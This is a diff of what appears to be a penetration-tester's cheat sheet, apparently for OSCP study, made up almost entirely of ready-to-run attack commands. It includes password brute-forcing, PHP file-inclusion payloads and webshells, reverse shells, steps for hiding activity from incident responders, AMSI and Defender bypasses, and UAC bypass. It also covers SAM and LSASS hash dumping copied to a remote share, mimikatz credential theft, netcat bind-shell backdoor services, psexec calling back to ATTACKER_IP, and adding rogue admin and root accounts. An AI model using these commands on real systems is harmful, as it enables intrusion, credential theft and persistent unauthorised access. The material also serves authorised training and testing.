-# using hydra
-# string format "<webform-path>:<username-field>=^USER^&<password-field>=^PASS^:<bad-pass-marker>"
-# '-l admin' means use only the 'admin' username. '-L userlist.txt' uses many usernames
-# '-P wordlist.txt' means iterate through all passwords in wordlist. '-p password123' uses only that one.
-# '-t 64': use 64 threads
-# change to https-web-form for port 443
-hydra -V -f -l admin -P ~/repos/SecLists/Passwords/Leaked-Databases/rockyou-50.txt $VICTIM_IP_OR_DOMAIN http-post-form "/blog/admin.php:username=^USER^&password=^PASS^:Incorrect username" -t 64
-
-# proxy-aware password bruteforcing with ffuf
-ffuf -x socks5://localhost:1080 -u http://$VICTIM_IP/login -X POST -w /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt -d "UsernameOrODEmail=admin&Password=FUZZ&RememberMe=true" -fw 6719
-```
-
-### 4.2.7. Zip File Password Cracking
+### 5.2.3. Zip File Password Cracking
 
 ```sh
 # using fcrackzip
@@ -1532,20 +1783,20 @@ zip2john myfile.zip > zipkey.john
 john zipkey.john --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
-## 4.3. Port Knocking
+## 5.3. Port Knocking
 
 ```sh
-# port knock on ports 22->23->24 with nmap
+# port knock on ports 24->23->22 with nmap
 # "-r" forces ports to be hit in order
 # may want to add "--max-parallelism 1"
-nmap -Pn --host-timeout 201 --max-retries 0 -r -p22,23,24 $VICTIM_IP
+nmap -Pn --host-timeout 201 --max-retries 0 -r -p24,23,22 $VICTIM_IP
 
 # doing the same thing with netcat
 # NOTE: netcat can only knock on sequential ports without using a for-loop
 nc -z $VICTIM_IP 22-24
 ```
 
-## 4.4. Buffer Overflows
+## 5.4. Buffer Overflows
 
 I wrote a great python script for tackling the old-school OSCP BOF boxes.
 Check it out [here](tools/pwn-bof-template.py).
@@ -1588,123 +1839,7 @@ msf-pattern_offset -q EIP_VAL
 !mona jmp -r esp -cpb '\x00\x51'
 ```
 
-## 4.5. PHP Exploitation
-
-### 4.5.1. LFI/RFI
-
-Some handy PHP wrappers:
-[PHP Documentation: Wrappers](https://www.php.net/manual/en/wrappers.php)
-
-Using php-wrapper with 'filter' to grab local files:
-- docs: [https://www.php.net/manual/en/wrappers.php.php](https://www.php.net/manual/en/wrappers.php.php)
-
-```sh
-# filter without any processing to grab plaintext:
-php://filter/resource=/path/to/flle
-
-# base64 encode file before grabbing (helps grab php source or binary files)
-# available starting with PHP 5.0.0
-php://filter/convert.base64-encode/resource=/path/to/file
-
-# ROT13 encode file:
-php://filter/read=string.rot13/resource=/etc/passwd
-
-# chaining multiple filters with "|":
-php://filter/string.toupper|string.rot13/resource=/path/to/file
-
-# list of useful filters:
-# https://www.php.net/manual/en/filters.php
-string.toupper
-string.tolower
-string.rot13
-convert.base64-encode
-convert.base64-decode
-zlib.deflate  # i.e. gzip, without headers/trailers
-zlib.inflate  # i.e. gunzip
-bzip2.compress
-bzip2.decompress
-```
-
-Some other handy wrappers:
-
-```sh
-# if enabled (not default), run commands:
-expect://whoami
-
-# Use this one as the query param's value to tell it to look at the POST
-# request body for the text to insert there. Useful for injecting complex
-# php payloads
-php://input
-# example POST body: <?php system('whoami'); ?>
-
-# Inject your own string into the file:
-data://text/plain;base64,SSBsb3ZlIFBIUAo=  # injects "I love PHP"
-# can be used to inject arbitrary php code!
-
-# When injecting php code, a good way to test code execution is with:
-<?php phpinfo();?>
-
-# use "data:" to inject executable php code directly into the URL
-data:text/plain,<?php phpinfo(); ?>
-data:,<?system($_GET['x']);?>&x=ls
-data:;base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4=&x=ls
-
-# FILTER BYPASSES:
-# Sometimes you can bypass filters or trick PHP not to concatenate a .php file extension onto
-# a file path by injecting a NULL byte. E.g.:
-?page=../../../etc/passwd%00
-# You can take this technique further and URL-encode the entire php://filter
-# directive to hopefully bypass server-side filters on it. Or even double-URL-
-# encode the string.
-# Also try bypassing filters with ....// instead of ../
-```
-
-You can get code execution by poisoning local files, including log files and
-PHP session files with PHP code.
-
-Common PHP sessions file locations:
-- c:\Windows\Temp
-- /tmp/
-- /var/lib/php5
-- /var/lib/php/session
-
-Default session filename: `sess_<SESSION_ID>`
-(grab SESSION_ID from your cookies in the browser)
-
-The following are some Linux system files that have sensitive information that
-are good to try to grab when you have an LFI vulnerability.
-
-```
-/etc/issue
-/etc/passwd
-/etc/shadow
-/etc/group
-/etc/hosts
-/etc/motd
-/etc/mysql/my.cnf
-/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the file descriptor)
-/proc/self/environ
-/proc/version
-/proc/cmdline
-```
-
-
-### 4.5.2. One-liner PHP Webshells
-
-Simple one-liner web shells for when you can drop/modify a local php file:
-
-```php
-<?php echo passthru($_GET['cmd']); ?>
-
-<?php echo exec($_POST['cmd']); ?>
-
-<?php echo shell_exec($_REQUEST['cmd']); ?>
-
-<?php system($_GET['cmd']); ?>
-
-```
-
-## 4.6. Reverse Shells
+## 5.5. Reverse Shells
 
 - [Pentest Monkey Cheatsheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
 - [Reverse Shell Generator](https://www.revshells.com/)
@@ -1810,7 +1945,7 @@ sudo openssl s_server -accept 443 -key key.pem -cert cert.pem
 rm -f /tmp/f; mkfifo /tmp/f && openssl s_client -connect SERVER_IP:443 -quiet < /tmp/f 2>/dev/null | /bin/sh 2>&0 > /tmp/f &
 ```
 
-### 4.6.1. Covering your tracks
+### 5.5.1. Covering your tracks
 
 When you connect via a reverse/bind shell, your commands get saved in the
 terminal history. To avoid logging this (to make incident response team's job
@@ -1828,7 +1963,7 @@ Set-PSReadlineOption –HistorySaveStyle SaveNothing
 Remove-Module PSReadline
 ```
 
-### 4.6.2. Running a detached/daeminized process on Linux
+### 5.5.2. Running a detached/daeminized process on Linux
 
 When delivering a payload, sometimes it needs to run as a daemon so it doesn't
 die when the session/connection is closed. Normally you do this with `nohup`,
@@ -1839,9 +1974,9 @@ Still, you can accomplish creating a daemonized process by using sub-shells:
 ( ( while true; do echo "insert reverse shell cmd here"; sleep 5; done &) &)
 ```
 
-## 4.7. Encryption
+## 5.6. Encryption
 
-### 4.7.1. Create self-signed SSL/TLS certificate
+### 5.6.1. Create self-signed SSL/TLS certificate
 
 ```sh
 # generate separate .key and .crt files
@@ -1862,7 +1997,7 @@ openssl req -x509 -new -nodes -key ca.key -sha256 -days 365 -out client.pem
 openssl pkcs12 -export -in client.pem -inkey ca.key -out client.p12
 ```
 
-### 4.7.2. Decrypting files with GPG
+### 5.6.2. Decrypting files with GPG
 
 ```sh
 # import public and private keys into gpg
@@ -1878,36 +2013,9 @@ gpg --list-secret-keys
 gpg -d -o secret.txt secret.txt.gpg
 ```
 
-## 4.8. Post Exploit Frameworks
+# 6. Windows
 
-### 4.8.1. Merlin Framework
-
-```sh
-# get server (password: merlin)
-mkdir /opt/merlin;cd /opt/merlin
-wget https://github.com/Ne0nd0g/merlin/releases/latest/download/merlinServer-Linux-x64.7z
-7z x merlinServer-Linux-x64.7z
-sudo ./merlinServer-Linux-x64
-
-# get agent code
-go get github.com/Ne0nd0g/merlin-agent
-cd ~/go/pkg/mod/github.com/\!ne0nd0g/merlin-agent*
-
-# compile agent
-chmod -R +w .
-make linux SLEEP=5s URL=https://$(vpnip)
-cd bin/*
-# other make options:
-# Windows agent: make windows
-# Linux agent: make linux
-# macOS agent: make darwin
-# MIPS agent: make mips
-# ARM agent: make arm
-```
-
-# 5. Windows Privilege Escalation
-
-## 5.1. Basic Windows Post-Exploit Enumeration
+## 6.1. Basic Windows Post-Exploit Enumeration
 
 ```bat
 :: Basic System Info
@@ -1922,7 +2030,7 @@ whoami /all
 net user
 net localgroup
 
-:: Who has admin privileges?
+:: Who has local admin privileges?
 net localgroup Administrators
 
 :: More info about a specific user. Check if user has privileges.
@@ -2076,7 +2184,7 @@ reg add HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription /v Ena
 powershell -c "Get-ChildItem​ HKCU:\Software\Microsoft\Windows\CurrentVersion\Lxss | %{​Get-ItemProperty​ ​$_​.PSPath} | ​out-string​ -width ​4096"
 ```
 
-## 5.2. Using Saved Windows Credentials
+## 6.2. Using Saved Windows Credentials
 
 ```bat
 :: List saved credentials
@@ -2085,7 +2193,7 @@ cmdkey /list
 runas /savecred /user:admin C:\Users\Public\revshell.exe
 ```
 
-## 5.3. Check Windows File Permissions
+## 6.3. Check Windows File Permissions
 
 ```bat
 :: Using accesschk from SysInternals Suite
@@ -2099,9 +2207,9 @@ accesschk.exe /accepteula -quvwc SERVICENAME
 :: e.g. sc config SERVICENAME binpath= "net localgroup administrators user /add"
 ```
 
-## 5.4. Antivirus & Firewall Evasion
+## 6.4. Antivirus & Firewall Evasion
 
-### 5.4.1. Windows AMSI Bypass
+### 6.4.1. Windows AMSI Bypass
 
 This one-liner lets you get past Windows' Antimalware Scan Interface (AMSI), which
 will e.g. block malicious powershell scripts from running. If you get a warning
@@ -2114,20 +2222,20 @@ $a=[Ref].Assembly.GetTypes();foreach($b in $a){if ($b.Name -like "*iUtils") {$c=
 
 Other bypasses available through nishang's [Invoke-AMSIBypass](https://github.com/samratashok/nishang/blob/master/Bypass/Invoke-AmsiBypass.ps1).
 
-### 5.4.2. Turn off Windows Firewall
+### 6.4.2. Turn off Windows Firewall
 
 ```bat
 :: must be done from administrator prompt
 netsh advfirewall set allprofiles state off
 ```
 
-### 5.4.3. Turn off Windows Defender
+### 6.4.3. Turn off Windows Defender
 
 ```powershell
 Set-MpPreference -DisableRealtimeMonitoring $true
 ```
 
-### 5.4.4. Windows LOLBAS Encoding/Decoding
+### 6.4.4. Windows LOLBAS Encoding/Decoding
 
 ```bat
 :: base64 encode a file
@@ -2140,7 +2248,7 @@ certutil --decodehex encoded_hexadecimal_InputFileName
 certutil -hashfile somefile.txt MD5
 ```
 
-### 5.4.5. Execute Inline Tasks with MSBuild.exe
+### 6.4.5. Execute Inline Tasks with MSBuild.exe
 
 MSBuild is built into Windows .NET framework, and it lets you execute arbitrary
 C#/.NET code inline. Modify the XML file below with your shellcode from
@@ -2234,7 +2342,7 @@ with Empire)
 </Project>
 ```
 
-### 5.4.6. Custom Windows TCP Reverse Shell
+### 6.4.6. Custom Windows TCP Reverse Shell
 
 A custom reverse shell can often get past antivirus.
 
@@ -2293,7 +2401,7 @@ sudo apt install mingw-w64 wine
 i686-w64-mingw32-gcc rsh.c -o rsh.exe -s -lws2_32
 ```
 
-## 5.5. Windows UAC Bypass
+## 6.5. Windows UAC Bypass
 
 ```powershell
 # Ref: https://mobile.twitter.com/xxByte/status/1381978562643824644
@@ -2305,7 +2413,7 @@ fodhelper
 Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
 ```
 
-## 5.6. Windows Pass-The-Hash Attacks
+## 6.6. Windows Pass-The-Hash Attacks
 
 There are lots of ways to pass the hash on windows, giving you access as a user
 with just the hash of their creds.
@@ -2336,13 +2444,13 @@ pth-winexe -U 'admin%hash' //WINBOX_IP cmd.exe
 # other options: xfreerdp, smbclient
 ```
 
-## 5.7. Windows Token Impersonation
+## 6.7. Windows Token Impersonation
 
 These require the SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege to
 be enabled. This is the case when you have a shell running as
 "nt authority\local service"
 
-### 5.7.1. Windows Token Impersonation with RoguePotato
+### 6.7.1. Windows Token Impersonation with RoguePotato
 
 ```sh
 # on kali box, set up socat redirector for roguepotato to bounce off of
@@ -2358,7 +2466,7 @@ RoguePotato.exe -r KALI_IP -e "C:\Users\Public\revshell.exe" -l 9999
 :: and bingo! you should have system on the listener you set up!
 ```
 
-### 5.7.2. Windows Token Impersonation with PrintSpoofer
+### 6.7.2. Windows Token Impersonation with PrintSpoofer
 
 First set up a netcat listener on Kali to catch the reverse shell.
 
@@ -2368,7 +2476,7 @@ First set up a netcat listener on Kali to catch the reverse shell.
 PrintSpoofer.exe -c "C:\Users\Public\revshell.exe" -i
 ```
 
-### 5.7.3. Windows Service Escalation - Registry
+### 6.7.3. Windows Service Escalation - Registry
 
 Vulnerable when:
 
@@ -2469,72 +2577,210 @@ reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND
 sc start regsvc
 ```
 
-## 5.8. Compiling Windows Binaries on Linux
+## 6.8. Compiling Windows Binaries on Linux
 
 You can use `mingw` to compile C files.
 
-[MonoDevelop](https://www.monodevelop.com/download/) is a cross-platform IDE
-for C# and .NET.
+[MonoDevelop](https://www.monodevelop.com/download/) is a cross-platform IDE for C# and .NET.
 
-## 5.9. Miscellaneous Windows Commands
+## 6.9. Windows Passwords & Hashes
+
+Encrypted passwords can often be recovered with tools like [NirSoft](http://www.nirsoft.net/password_recovery_tools.html)
+
+### 6.9.1. Finding Windows Passwords in Files
 
 ```bat
-:: restart/reboot the machine now
-shutdown /r /t 0
+:: search specific filetypes for "password"
+findstr /spin password *.txt *.xml *.ini *.config
 
-:: infinite loop of command with 5s timeout between runs
-for /l %n in () do @(
-  @echo Working really hard...
-  timeout /t 5 /nobreak > NUL
-)
+:: Searching all files (lots of output)
+findstr /spin "password" *.*
 
-:: run regedit as SYSTEM (to view protected keys)
-psexec.exe -i -s regedit.exe
-:: check out HKLM\Software\Microsoft\Windows NT\Current Version\Winlogon\
-
-:: recursively list files with Alternate Data Streams
-dir /s /r /a | find ":$DATA"
-gci -recurse | % { gi $_.FullName -stream * } | where {(stream -ne ':$Data') -and (stream -ne 'Zone.Identifier')}
-:: print Alternate Data Stream to console
-powershell get-content -path /path/to/stream/file  -stream STREAMNAME
-:: hide a file in an Alternate Data Stream
-type evil.exe > benign.dll:evil.exe
-:: delete ADS from file
-powershell remove-item -path /path/to/stream/file  -stream STREAMNAME
-
-:: Check if OS is 64-bit
-(wmic os get OSArchitecture)[2]
-
-:: Set terminal to display ansi-colors
-reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
-powershell Set-ItemProperty HKCU:\Console VirtualTerminalLevel -Type DWORD 1
+:: find files that might have credentials in them
+cd \ && dir /b /s *vnc.ini Groups.xml sysprep.* Unattend.* Unattended.*
+dir /b /s *passw* *creds* *credential*
+dir /b /s *.config *.conf *.cfg
 ```
 
-```powershell
-# determine if current powershell process is 64-bit
-[System.Environment]::Is64BitProcess
+#### 6.9.1.1. Files with Passwords on Windows
 
-# determine if OS is 64-bit (various methods)
-[System.Environment]::Is64BitOperatingSystem
-(Get-WMIObject Win32_OperatingSystem).OSArchitecture
-(Get-WMIObject CIM_OperatingSystem).OSArchitecture
-(Get-WMIObject Win32_Processor).AddressWidth
-[System.IntPtr]::Size  # 4 = 32-bit, 8 = 64-bit
+Some of these passwords are cleartext, others are base64-encoded. Groups.xml has
+an AES-encrypted password, but the static key is published on the MSDN website.
 
-# Base64 Decode
-[System.Text.Encoding]::UTF8.GetSTring([System.convert]::FromBase64String("BASE64STRING"))
+```bat
+:: Unattend files
+%SYSTEMDRIVE%\unattend.txt
+%WINDIR%\Panther\Unattend\Unattended.xml
+%WINDIR%\Panther\Unattended.xml
 
-# Zip a directory using Powershell 3.0 (Win8)
-Add-Type -A 'System.IO.Compression.FileSystem';
-[IO.Compression.ZipFile]::CreateFromDirectory('C:\folder', 'C:\output.zip')
+:: Group Policy Object files
+:: decode 'cpassword' with kali gpp-decrypt or gpp-decrypt.py (https://github.com/t0thkr1s/gpp-decrypt)
+%WINDIR%\SYSVOL\Groups.xml
+%WINDIR%\SYSVOL\scheduledtasks.xml
+%WINDIR%\SYSVOL\Services.xml
 
-# Zip a directory using Powershell 5.0 (Win10)
-Compress-Archive -Path 'C:\folder' -DestinationPath 'C:\output.zip'
+:: sysprep
+%SYSTEMDRIVE%\sysprep.inf
+%SYSTEMDRIVE%\sysprep\sysprep.xml
+
+:: less likely, still worth looking
+%SYSTEMDRIVE%\pagefile.sys
+%WINDIR%\debug\NetSetup.log
+%WINDIR%\iis6.log
+%WINDIR%\system32\config\AppEvent.Evt
+%WINDIR%\system32\config\SecEvent.Evt
+%WINDIR%\system32\CCM\logs\*.log
+%USERPROFILE%\ntuser.dat
+%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
 ```
 
-## 5.10. Lateral Movement in Windows Active Directory
+To decrypt the Groups.xml password: `gpp-decrypt encryptedpassword`
 
-### 5.10.1. Quick Active Directory Enumeration
+### 6.9.2. Windows Passwords in Registry
+
+```bat
+:: Windows autologin credentials (32-bit and 64-bit versions)
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" /reg:64 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"
+
+:: VNC
+reg query "HKCU\Software\ORL\WinVNC3\Password"
+reg query "HKCU\Software\TightVNC\Server"
+
+:: SNMP Paramters
+reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
+
+:: Putty
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
+
+:: Search for password in registry
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+```
+
+### 6.9.3. Getting Saved Wifi Passwords on Windows
+
+```bat
+:: show all saved wifi networks
+netsh wlan show profiles
+
+:: get password of specific network 'profilename'
+wlan show profile profilename key=clear
+
+:: PEAP wifi network passwords are stored in registry
+reg save 'HKLM\Software\Microsoft\Wlansvc\UserData\Profiles' peap-profiles-hklm.hiv
+reg save 'HKCU\Software\Microsoft\Wlansvc\UserData\Profiles' peap-profiles-hkcu.hiv
+
+:: Display all keys, values and data under the PEAP profiles:
+reg query 'HKLM\Software\Microsoft\Wlansvc\UserData\Profiles' /s /f *
+```
+
+### 6.9.4. Dumping Hashes from Windows
+
+```bat
+:: Grab them from the registry
+reg save hklm\sam %TEMP%\sam.hiv /y
+reg save hklm\system %TEMP%\system.hiv /y
+reg save hklm\security %TEMP%\security.hiv /y
+copy %TEMP%\sam.hiv \\192.168.119.144\share
+copy %TEMP%\system.hiv \\192.168.119.144\share
+copy %TEMP%\security.hiv \\192.168.119.144\share
+
+:: clean up stolen registry files
+del %TEMP%\*.hiv
+
+:: Grab the backups from disk
+copy %WINDIR%\repair\sam \\192.168.119.144\share\sam-repair.hiv
+copy %WINDIR%\repair\system \\192.168.119.144\share\system-repair.hiv
+copy %WINDIR%\repair\security \\192.168.119.144\share\security-repair.hiv
+```
+
+Then, on attack box:
+
+```sh
+# using impacket secretsdump.py (security.hiv optional)
+impacket-secretsdump -sam sam.hiv -system system.hiv -security security.hiv -outputfile secretsdump LOCAL
+```
+
+Alternatively, you can grab the hashes directly from LSASS.exe memory using
+Sysinternals tools:
+
+```bat
+procdump64.exe -accepteula -ma lsass.exe %TEMP%\lsass.mem
+copy %TEMP%\lsass.mem \\192.168.119.144\share
+```
+
+#### 6.9.4.1. Dumping Hashes from Windows Registry Backups
+
+Look for these files:
+
+```bat
+%WINDIR%\repair\sam
+%WINDIR%\repair\system
+%WINDIR%\repair\software
+%WINDIR%\repair\security
+
+%WINDIR%\system32\config\default.sav
+%WINDIR%\system32\config\security.sav
+%WINDIR%\system32\config\software.sav
+%WINDIR%\system32\config\system.sav
+
+%SYSTEMROOT%\ntds\ntds.dit
+```
+
+#### 6.9.4.2. Dumping Hashes from Windows Domain Controller
+
+DCSync Attack
+
+```sh
+# requires authentication
+impacket-secretsdump -just-dc-ntlm -outputfile secretsdump DOMAIN/username:Password@DC_IP_or_FQDN
+```
+
+### 6.9.5. Using mimikatz to dump hashes and passwords
+
+[PayloadsAllTheThings: Mimikatz](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md)
+
+```bat
+.\mimikatz.exe
+:: enable full debug privileges to have access to system memory
+privilege::debug
+:: elevate to system
+token::elevate
+:: get hashes and try to print plaintext passwords
+sekurlsa::logonpasswords
+:: tries to extract plaintext passwords from lsass memory
+sekurlsa::wdigest
+:: dump hashes from SAM
+lsadump::sam
+:: list all available kerberos tickets
+sekurlsa::tickets
+:: Get just the krbtgt kerberos tikcket
+sekurlsa::krbtgt
+:: List Current User's kerberos tickets
+kerberos::list
+
+:: get google chrome saved credentials
+dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
+dpapi::chrome /in:"c:\users\administrator\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
+```
+
+## 6.10. Windows Files of Interest
+
+```bat
+:: GPG keys
+dir /s /b /a C:\users\*.gpg
+:: usually under C:\Users\*\AppData\Roaming\gnupg\
+
+:: KeePass databases:
+dir *.kdb /a /b /s
+
+%WINDIR%\System32\drivers\etc\hosts
+```
+
+## 6.11. Lateral Movement in Windows Active Directory
+
+### 6.11.1. Quick Active Directory Enumeration
 
 This script will provide a quick listing of all computers, users, service
 accounts, groups and memberships on an Active Directory domain.
@@ -2577,9 +2823,214 @@ $s.FindAll()|?{_r $_ $m | out-null};
 $m|sort-object OU -unique|?{write-host ([string]::Format("[OU] {0}: {1}",$_.OU,$_.M))};
 ```
 
-# 6. Linux Privilege Escalation
+## 6.12. Miscellaneous Windows Commands
 
-## 6.1. Basic Linux Post-Exploit Enumeration
+cmd.exe:
+
+```bat
+:: restart/reboot the machine now
+shutdown /r /t 0
+
+:: infinite loop of command with 5s timeout between runs
+for /l %n in () do @(
+  @echo Working really hard...
+  timeout /t 5 /nobreak > NUL
+)
+
+:: run regedit as SYSTEM (to view protected keys)
+psexec.exe -i -s regedit.exe
+:: check out HKLM\Software\Microsoft\Windows NT\Current Version\Winlogon\
+
+:: recursively list files with Alternate Data Streams
+dir /s /r /a | find ":$DATA"
+gci -recurse | % { gi $_.FullName -stream * } | where {(stream -ne ':$Data') -and (stream -ne 'Zone.Identifier')}
+:: print Alternate Data Stream to console
+powershell get-content -path /path/to/stream/file  -stream STREAMNAME
+:: hide a file in an Alternate Data Stream
+type evil.exe > benign.dll:evil.exe
+:: delete ADS from file
+powershell remove-item -path /path/to/stream/file  -stream STREAMNAME
+
+:: Check if OS is 64-bit
+(wmic os get OSArchitecture)[2]
+
+:: Set terminal to display ansi-colors
+reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
+powershell Set-ItemProperty HKCU:\Console VirtualTerminalLevel -Type DWORD 1
+```
+
+PowerShell:
+
+```powershell
+# determine if current powershell process is 64-bit
+[System.Environment]::Is64BitProcess
+
+# determine if OS is 64-bit (various methods)
+[System.Environment]::Is64BitOperatingSystem
+(Get-WMIObject Win32_OperatingSystem).OSArchitecture
+(Get-WMIObject CIM_OperatingSystem).OSArchitecture
+(Get-WMIObject Win32_Processor).AddressWidth
+[System.IntPtr]::Size  # 4 = 32-bit, 8 = 64-bit
+
+# Base64 Decode
+[System.Text.Encoding]::UTF8.GetSTring([System.convert]::FromBase64String("BASE64STRING"))
+
+# Zip a directory using Powershell 3.0 (Win8)
+Add-Type -A 'System.IO.Compression.FileSystem';
+[IO.Compression.ZipFile]::CreateFromDirectory('C:\folder', 'C:\output.zip')
+
+# Zip a directory using Powershell 5.0 (Win10)
+Compress-Archive -Path 'C:\folder' -DestinationPath 'C:\output.zip'
+```
+
+## 6.13. Windows Persistence
+
+### 6.13.1. Remote SYSTEM Backdoor
+
+These techniques require having Admin credentials for the target machine.
+
+#### 6.13.1.1. Using Windows Services
+
+```bat
+:: You must establish SMB session with admin creds first!!
+net use \\VICTIM_NAME [PASSWORD] /u:Administrator
+:: or mount an smb share on the target:
+net use * \\VICTIM_NAME\[share] [PASSWORD] /u:Administrator
+
+:: open a backdoor netcat bind-shell with system privileges on a remote host
+sc \\VICTIM_NAME create scvhost binpath= "cmd.exe /k %temp%\nc.exe -l -p 22222 -e cmd.exe"
+
+:: start the service
+sc \\VICTIM_NAME start scvhost
+
+:: delete the service
+sc \\VICTIM_NAME delete scvhost
+```
+
+#### 6.13.1.2. Using PSExec
+
+NOTE: SysInternals PSExec leaves a copy of the service on the machine after
+you run it, which you must manually remove with `sc \\VICTIM_NAME delete psexec`.
+The Metasploit module and nmap NSE script clean up the service for you.
+
+```bat
+:: '-c' passes copy of command to remote systsem even if not already present
+:: '-s' runs command as systsem
+:: '-d' runs command in detached mode. Use if you want PSExec to run something
+:: in the background (won't wait for process to finish, nor passs input/output
+:: back to caller).
+psexec \\VICTIM_IP -c -s -d -u Administrator -p password "nc.exe -n ATTACKER_IP -e cmd.exe"
+:: If username and password are omitted, psexec uses current user's creds on
+:: the remote machine.
+```
+
+#### 6.13.1.3. Using Scheduled Tasks
+
+```bat
+:: schtasks ("/ru system" runs as system)
+schtasks /create /tn TASKNAME /s VICTIM_IP /u Administrator /p password /sc FREQUENCY /st HH:MM:SS /sd MM/DD/YYY /ru system /tr COMMAND
+:: frequency: once, minute, hourly, daily, weekly, monthly, onstart, onlogon, onidle
+
+:: query schtasks
+schtasks /query /s VICTIM_IP
+
+:: delete schtask ('/f' to force)
+schtasks /delete /s VICTIM_IP /u Administrator /p password /tn TASKNAME
+
+:: at (deprecated on newer machines, but still should work)
+at \\VICTIM_IP HH:MM[A|P] COMMAND
+
+:: query at
+at \\VICTIM_IP
+```
+
+### 6.13.2. Remote Admin Backdoor via WMIC
+
+```bat
+:: create admin bind-shell backdoor. Use '-d' for it to run without window
+wmic process call create "%temp%\nc.exe -dlp 22222 -e cmd.exe"
+
+:: delete the wmic process
+wmic process where name="nc.exe" delete
+```
+
+### 6.13.3. Add RDP User
+
+```bat
+net user hacker P@$$w0rd /add
+net localgroup Administrators hacker /add
+net localgroup "Remote Desktop Users" hacker /ADD
+:: enable remote desktop
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+:: delete user
+net user hacker /del
+:: disable remote desktop
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
+```
+
+### 6.13.4. Connect to Windows RDP
+
+```sh
+xfreerdp /d:domain /u:username /p:password +clipboard /cert:ignore /size:960x680 /v:$VICTIM_IP
+# to attach a drive, use:
+# /drive:share,/mnt/vm-share/oscp/labs/public/5-alice/loot
+```
+
+### 6.13.5. Change Windows Domain Credentials
+
+If you want to change the password of a user on a windows domain:
+
+```powershell
+Set-ADAccountPassword -Identity someuser -OldPassword (ConvertTo-SecureString -AsPlainText "p@ssw0rd" -Force) -NewPassword (ConvertTo-SecureString -AsPlainText "qwert@12345" -Force)
+```
+
+### 6.13.6. Create Windows Backdoor Service
+
+```bat
+:: Creates a SYSTEM bind-shell listening on port 54321
+sc create bdsvc binpath= "c:\windows\system32\cmd.exe /k c:\users\public\nc.exe -d -L -p 54321 -e c:\windows\system32\cmd.exe"
+sc create bdsvc binpath= "c:\windows\system32\cmd.exe /k c:\users\public\ncat.exe -lk -p 54321 -e c:\windows\system32\cmd.exe"
+:: Alternative: add \\computername after sc to do it remotely
+
+:: start backdoor service
+sc start bdsvc
+:: or
+net start bdsvc
+
+:: stop and delete backdoor service
+sc delete bdsvc
+```
+
+# 7. Linux
+
+## 7.1. Upgrading to Interactive Shell
+
+Use this if you have a netcat-based reverse shell (on Linux box).
+
+```sh
+# In reverse shell ##########
+python3 'import pty; pty.spawn("/bin/bash")'
+# windows
+c:\python27\python.exe -c 'import pty; pty.spawn("c:\windows\system32\cmd.exe")'
+
+# Ctrl-Z, jumps you back to local shell by backgrounding reverse shell
+
+# In local shell ##########
+# Get TTY rows/cols for later:
+stty size # prints "rows cols"
+# ignore hotkeys in the local shell and get back to remote shell
+stty raw -echo; fg # hit enter TWICE after this
+
+# In reverse shell ##########
+# set correct size for remote shell (ROWS and COLS from stty size)
+stty rows ROWS cols COLS
+# enable terminal colors
+export TERM=xterm-256color
+# reload bash to apply TERM env var
+exec /bin/bash
+```
+
+## 7.2. Basic Linux Post-Exploit Enumeration
 
 ```sh
 # minimum commands
@@ -2772,7 +3223,7 @@ cat /etc/motd
 getenforce
 ```
 
-## 6.2. Watching for Linux Process Changes
+## 7.3. Watching for Linux Process Changes
 
 ```sh
 #!/bin/bash
@@ -2791,7 +3242,7 @@ while true; do
 done
 ```
 
-## 6.3. Adding root user to /etc/shadow or /etc/passwd
+## 7.4. Adding root user to /etc/shadow or /etc/passwd
 
 ```sh
 # if /etc/shadow is writable
@@ -2802,16 +3253,16 @@ openssl passwd -1 -salt derp password
 # edit /etc/shadow and overwrite hash of root with this one
 
 # if /etc/passwd is writable
-echo "root2:$(mkpasswd -m sha-512 password):0:0:root:/root:/bin/bash" >> /etc/passwd
+echo "derp:$(mkpasswd -m sha-512 password):0:0:root:/root:/bin/bash" >> /etc/passwd
 # alternatively
-echo "root2:$(openssl passwd -1 -salt derp password):0:0:root:/root:/bin/bash" >> /etc/passwd
+echo "derp:$(openssl passwd -1 -salt derp password):0:0:root:/root:/bin/bash" >> /etc/passwd
 # pre-computed for password 'herpaderp':
 echo 'derp:$5$derp$uEWQFRg/9idrisiL6SgLNfSAv3.UNCc7eHUv.L1Wlo.:0:0:root:/root:/bin/bash' >> /etc/passwd
 
 # can also add generated password between the first and second colon of root user
 ```
 
-## 6.4. Escalating via sudo binaries
+## 7.5. Escalating via sudo binaries
 
 Many binaries let you run commands from within them. If you get limited `sudo`
 permissions for one of the binaries, you can escalate to root.
@@ -2830,7 +3281,7 @@ sudo awk 'BEGIN {system("/bin/sh")}'
 sudo find . -exec /bin/sh \; -quit
 ```
 
-## 6.5. LD_PRELOAD and LD_LIBRARY_PATH
+## 7.6. LD_PRELOAD and LD_LIBRARY_PATH
 
